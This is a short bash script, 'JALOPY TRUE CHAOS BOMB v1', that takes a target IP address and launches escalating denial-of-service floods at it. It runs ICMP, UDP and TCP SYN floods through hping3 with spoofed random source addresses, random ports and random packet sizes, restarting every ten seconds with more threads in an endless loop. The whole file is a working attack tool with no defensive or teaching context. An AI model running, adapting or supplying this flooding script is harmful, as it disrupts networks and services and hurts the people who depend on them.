#!/bin/bash

clear
echo -e "\e[1;31m======================================"
echo -e "    JALOPY TRUE CHAOS BOMB v1"
echo -e "======================================\e[0m"
echo ""

read -p "Enter the target IP address: " target

echo ""
echo -e "\e[1;31mUnleashing absolute chaos on $target...\e[0m"
sleep 2

thread_count=5

while true
do
    for ((i=1; i<=thread_count; i++))
    do
        randproto=$(( RANDOM % 3 ))
        randport=$(( ( RANDOM % 65535 )  + 1 ))
        packetsize=$(( ( RANDOM % 1400 )  + 100 ))
        
        case $randproto in
            0)
                echo -e "\e[1;32m[*] [THREAD $i] ICMP Flood $target ($packetsize bytes)\e[0m"
                sudo hping3 -1 --flood --rand-source -d $packetsize -i u50 $target &
                ;;
            1)
                echo -e "\e[1;33m[*] [THREAD $i] UDP Flood $target Port $randport ($packetsize bytes)\e[0m"
                sudo hping3 --udp --flood --rand-source -p $randport -d $packetsize -i u100 $target &
                ;;
            2)
                echo -e "\e[1;35m[*] [THREAD $i] TCP SYN Flood $target Port $randport ($packetsize bytes)\e[0m"
                sudo hping3 -S --flood --rand-source -p $randport -d $packetsize -i u150 $target &
                ;;
        esac
    done

    sleep 10

    echo -e "\e[1;31m[*] Killing all current attacks... scaling up!\e[0m"
    sudo pkill hping3

    # Increase thread count slowly over time
    thread_count=$((thread_count + 1))

    echo -e "\e[1;34m[*] Increasing attack strength — threads: $thread_count\e[0m"
    sleep 2
done
